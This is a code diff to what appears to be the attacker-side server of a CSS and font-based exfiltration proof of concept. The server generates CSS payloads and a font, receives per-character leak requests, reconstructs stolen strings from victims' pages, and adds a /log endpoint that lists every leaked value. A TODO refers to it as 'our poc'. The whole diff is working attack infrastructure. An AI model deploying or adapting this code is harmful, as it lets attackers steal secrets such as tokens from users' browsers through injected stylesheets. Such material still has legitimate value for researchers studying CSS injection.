@@ -226,6 +226,7 @@ def generate_static_payload(
 
     # Store the static leak setup
     static_leak_setup[new_id] = params
+    logger.info("Saved leak setup with id %s", new_id)
 
     # Generate font path
     font_path, step_map = dynamic_font.generate(
@@ -254,6 +255,8 @@ def generate_static_payload(
         browser=browser,
     )
 
+    css = css.replace('\\', '\\\\')
+
     return Response(
         content=css,
         media_type="text/css",
@@ -261,21 +264,27 @@ def generate_static_payload(
     )
 
 
-@app.get("/leak")
-def leak(request: Request, params: LeakParams = Depends()):
-    logger.debug("Handling leak request with params: %s", params)
+# TODO: id is missing as a param here bt we didnt need it for our poc
+@app.get("/{param_idx}/{param_step}/{param_sid}")
+def leak(request: Request, param_idx: int, param_step: str, param_sid: str):
+    param_id = None
+    if param_step == 'a':
+        param_step = None
+    else:
+        param_step = int(param_step)
+    logger.debug("Handling leak request with params: param_idx: %d, param_step: %d, param_sid: %d", param_idx, param_step, param_sid)
     state, id = None, None
 
-    if params.id in leak_states:
-        id = params.id
-        state = leak_states[params.id]
-    elif params.sid:
+    if param_id in leak_states:
+        id = param_id
+        state = leak_states[param_id]
+    elif param_sid:
         # Handle static leak using sid
-        id = get_request_key(request) + "||" + params.sid
+        id = get_request_key(request) + "||" + param_sid
 
         # Create state if it doesn't exist
-        if id not in leak_states and params.sid in static_leak_setup:
-            static_params = static_leak_setup[params.sid]
+        if id not in leak_states and param_sid in static_leak_setup:
+            static_params = static_leak_setup[param_sid]
             leak_states[id] = LeakState(
                 id=id,
                 setup=static_params,
@@ -289,32 +298,32 @@ def leak(request: Request, params: LeakParams = Depends()):
 
     if state:
         # Update reconstruction and step
-        if params.step is None or params.step >= len(state.reconstruction):
-            if params.idx == len(state.setup.alphabet):
+        if param_step is None or param_step >= len(state.reconstruction):
+            if param_idx == len(state.setup.alphabet):
                 state.reconstruction += "🗅"
             else:
-                state.reconstruction += state.setup.alphabet[params.idx]
+                state.reconstruction += state.setup.alphabet[param_idx]
             state.step += 1
         else:
             state.reconstruction = list(state.reconstruction)
             chr = (
                 "🗅"
-                if params.idx == len(state.setup.alphabet)
-                else state.setup.alphabet[params.idx]
+                if param_idx == len(state.setup.alphabet)
+                else state.setup.alphabet[param_idx]
             )
             if not (
-                state.reconstruction[params.step] != chr
-                and state.reconstruction[params.step - 1] == chr
+                state.reconstruction[param_step] != chr
+                and state.reconstruction[param_step - 1] == chr
             ):
-                state.reconstruction[params.step] = chr
+                state.reconstruction[param_step] = chr
             state.reconstruction = "".join(state.reconstruction)
 
         logger.info("Leak update [%s]: %s", id, state.reconstruction)
 
         # Notify waiting requests
-        if params.id in leak_events:
-            leak_events[params.id].set()
-            leak_events[params.id].clear()
+        if param_id in leak_events:
+            leak_events[param_id].set()
+            leak_events[param_id].clear()
 
     return Response(
         content="",
@@ -328,6 +337,16 @@ def leak(request: Request, params: LeakParams = Depends()):
         },
     )
 
+@app.get("/log")
+def datalog():
+    output = ''
+    for key,val in leak_states.items():
+        output+=f'Leak id={key}\nReconstruction={val.reconstruction}\n\n===\n\n'
+
+    return Response(
+        content=output,
+        media_type="text/plain",
+    )
 
 @app.get("/font.ttf")
 def font(request: Request):
